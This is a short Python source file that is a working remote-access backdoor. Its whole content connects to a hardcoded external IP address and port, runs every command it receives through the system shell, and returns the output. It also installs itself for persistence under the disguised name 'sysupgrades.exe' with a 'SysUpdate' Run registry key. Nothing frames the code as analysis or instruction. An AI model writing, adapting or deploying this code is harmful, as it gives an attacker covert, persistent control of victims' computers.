import os
import shutil
import subprocess
import sys
import simplejson
import socket


class Socket:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def data_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                return simplejson.loads(data)
            except ValueError:
                continue

    def execute(self, command):
        return subprocess.check_output(command, shell=True)

    def start_socket(self):
        while True:
            command = self.data_receive()
            try:
                if command[0] == "quit":
                    self.connection.close()
                    exit()
                result = self.execute(command)
            except Exception:
                result = "Error"
            self.connection.send(simplejson.dumps(result).encode("utf-8"))
        self.connection.close()


def add_persistence():
    new_file = os.environ["appdata"] + "\\sysupgrades.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)


add_persistence()
IPAddr = "212.253.216.44"
Port = 8080
my_socket = Socket(IPAddr, Port)
my_socket.start_socket()
